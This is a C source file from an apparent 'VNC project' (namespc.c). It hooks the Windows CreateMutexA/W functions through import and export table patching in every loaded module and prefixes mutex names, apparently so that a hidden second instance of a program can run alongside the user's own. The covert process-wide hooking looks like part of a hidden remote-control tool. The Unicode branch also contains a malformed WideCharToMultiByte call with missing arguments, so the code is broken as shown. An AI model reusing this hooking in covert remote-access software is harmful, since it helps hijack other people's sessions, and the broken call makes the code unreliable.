//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: namespc.c
// $Revision: 166 $
// $Date: 2014-02-14 19:47:48 +0400 (Пт, 14 фев 2014) $
// description: 
//	 VNC namespace support module.


#include "vncmain.h"

typedef HANDLE (WINAPI* FUNC_CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPSTR lpName);
typedef HANDLE (WINAPI* FUNC_CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPWSTR lpName);

HANDLE WINAPI my_CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPSTR lpName);
HANDLE WINAPI my_CreateMutexW(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPWSTR lpName);


DECLARE_K32_HOOK(CreateMutexA);
DECLARE_K32_HOOK(CreateMutexW);


static HOOK_DESCRIPTOR NamespaceIatHooks[] = 
{
	DEFINE_K32_IAT_HOOK(CreateMutexA),
	DEFINE_K32_IAT_HOOK(CreateMutexW)
};

static HOOK_DESCRIPTOR NamespaceExportHooks[] =
{
	DEFINE_K32_EXP_HOOK(CreateMutexA),
	DEFINE_K32_EXP_HOOK(CreateMutexW)
};


static LPSTR	g_NamespacePrefixA = NULL;
static LPWSTR	g_NamespacePrefixW = NULL;
static ULONG	g_NamespacePrefixLen = 0;

// ---- Static functions ----------------------------------------------------------------------------------------------------

static WINERROR SetNamespaceHooks(VOID)
{
	WINERROR Status = NO_ERROR;
	ULONG	NumberIatHooks = sizeof(NamespaceIatHooks) / sizeof(HOOK_DESCRIPTOR);
	ULONG	NumberExpHooks = sizeof(NamespaceExportHooks) / sizeof(HOOK_DESCRIPTOR);

	if ((Status = SetMultipleHooks(NamespaceExportHooks, NumberExpHooks, NULL)) == NO_ERROR)
	{
		HMODULE*	ModArray = NULL;
		ULONG		ModCount = 0;

		if ((Status = PsSupGetProcessModules(GetCurrentProcess(), &ModArray, &ModCount)) == NO_ERROR)
		{
			ULONG i;

			for (i=0;i<ModCount;i++)
			{
				if (ModArray[i] != g_CurrentModule)
					SetMultipleHooks(NamespaceIatHooks, NumberIatHooks, ModArray[i]);
			}
			hFree(ModArray);
		}
		
		if (Status != NO_ERROR)
			RemoveMultipleHooks((PHOOK_DESCRIPTOR)&NamespaceExportHooks, NumberExpHooks);
	}	// if ((Status = SetMultipleHooks(&NamespaceExportHooks, NumberExpHooks, NULL)) == NO_ERROR)

	return(Status);
}

// ---- Public functions ---------------------------------------------------------------------------------------------------

VOID CleanupNamespace(VOID)
{
	if (g_NamespacePrefixA)
		hFree(g_NamespacePrefixA);

	if (g_NamespacePrefixW)
		hFree(g_NamespacePrefixW);
}


WINERROR InitNamespace(
	LPTSTR NamespacePrefix
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	g_NamespacePrefixLen = lstrlen(NamespacePrefix);

	do	// not a loop
	{
		if (!(g_NamespacePrefixA = hAlloc(g_NamespacePrefixLen + 1)))
			break;

		if (!(g_NamespacePrefixW = hAlloc((g_NamespacePrefixLen + 1) * sizeof(WCHAR))))
			break;

#ifdef _UNICODE
		lstrcpyW(g_NamespacePrefixW, NamespacePrefix);
//		wcstombs(g_NamespacePrefixA, NamespacePrefix, g_NamespacePrefixLen + 1);
		WideCharToMultiByte(
			CP_ACP,0,
			g_NamespacePrefixW,g_NamespacePrefixLen + 1,
			g_NamespacePrefixA,g_NamespacePrefixLen + 1,
			);
#else
		lstrcpyA(g_NamespacePrefixA, NamespacePrefix);
		//mbstowcs(g_NamespacePrefixW, NamespacePrefix, g_NamespacePrefixLen + 1);
		MultiByteToWideChar(
			CP_ACP,0,
			g_NamespacePrefixA,g_NamespacePrefixLen + 1,
			g_NamespacePrefixW, g_NamespacePrefixLen + 1
			);
#endif
		Status = SetNamespaceHooks();

	} while(FALSE);

	DbgPrint("Initialize VNC namespace with prefix \"%s\" done with status %u\n", NamespacePrefix, Status);

	return(Status);
}


// ---- Hook functions ------------------------------------------------------------------------------------------------------

HANDLE WINAPI my_CreateMutexA(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL		bInitialOwner,
  LPSTR		lpName
)
{
	HANDLE	hMutex;
	LPSTR	NewName = NULL;

	ENTER_HOOK();

	if (lpName)
	{
		if (NewName = hAlloc(lstrlenA(lpName) + g_NamespacePrefixLen + 2))
		{
			PCHAR pSlash;
			*NewName = 0;

			if (pSlash = StrRChrA(lpName, NULL, '\\'))
			{
				memcpy(NewName, lpName, (ULONG)(pSlash - lpName + 1));
				NewName[pSlash - lpName + 1] = 0;
				lpName = pSlash + 1;
			}

			lstrcatA(NewName, g_NamespacePrefixA);
			lstrcatA(NewName, lpName);

			DbgPrint("Replacing mutex \"%s\" with \"%s\"\n", lpName, NewName);
			lpName = NewName;
		}	// if (NewName = hAlloc(lstrlenA(lpName) + g_NamespacePrefixLen + 2))
	}	// if (lpName)

	hMutex = ((FUNC_CreateMutexA)hook_kernel32_CreateMutexA.Original)(lpMutexAttributes, bInitialOwner, lpName);

	if (NewName)
		hFree(NewName);

	LEAVE_HOOK();
	return(hMutex);
}


HANDLE WINAPI my_CreateMutexW(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL		bInitialOwner,
  LPWSTR	lpName
)
{
	HANDLE	hMutex;
	LPWSTR	NewName = NULL;

	ENTER_HOOK();

	if (lpName)
	{
		if (NewName = hAlloc((lstrlenW(lpName) + g_NamespacePrefixLen + 2) * sizeof(WCHAR)))
		{
			PWCHAR pSlash;
			*NewName = 0;

			if (pSlash = StrRChrW(lpName, NULL, '\\'))
			{
				memcpy(NewName, lpName, (ULONG)(pSlash - lpName + 1) * sizeof(WCHAR));
				NewName[pSlash - lpName + 1] = 0;
				lpName = pSlash + 1;
			}

			lstrcatW(NewName, g_NamespacePrefixW);
			lstrcatW(NewName, lpName);

			DbgPrint("Replacing mutex \"%S\" with \"%S\"\n", lpName, NewName);
			lpName = NewName;
		}	// if (NewName = hAlloc(lstrlenA(lpName) + g_NamespacePrefixLen + 2))
	}	// if (lpName)

	hMutex = ((FUNC_CreateMutexW)hook_kernel32_CreateMutexW.Original)(lpMutexAttributes, bInitialOwner, lpName);

	if (NewName)
		hFree(NewName);


	LEAVE_HOOK();
	return(hMutex);
}

